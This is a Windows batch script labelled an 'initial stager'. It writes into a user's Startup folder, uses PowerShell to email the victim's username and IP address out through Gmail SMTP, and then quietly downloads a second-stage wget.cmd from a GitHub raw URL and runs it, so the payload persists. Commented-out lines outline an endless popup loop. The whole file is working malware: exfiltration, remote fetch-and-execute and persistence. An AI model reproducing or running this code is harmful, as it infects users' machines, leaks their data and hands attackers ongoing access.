@echo off 
@REM initial stager created by : m98

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:\Users\arash\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM move into startup directory
cd /d "%STARTUP%"


@REM smtp
powershell $email = ""; $password = ""; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "$env:UserName logs"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);$smtp.Send($email, $email, $subject, $ip);


@REM todo: build out stage two
@REM write payload to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar2/refs/heads/main/wget.cmd?token=GHSAT0AAAAAAC7AO3Q3U6UP6HT5EFMGFS5QZ5SPXTQ -OutFile wget.cmd"


@REM run payload
powershell ./wget.cmd

@REM cd back into initial location
cd /d "%INITIALPATH%"


@REM del initial.cmd
@REM (
@REM echo @echo off
@REM echo : loop
@REM echo start /min cmd /c "popup.vbs"
@REM echo goto loop
@REM ) > payload.cmd


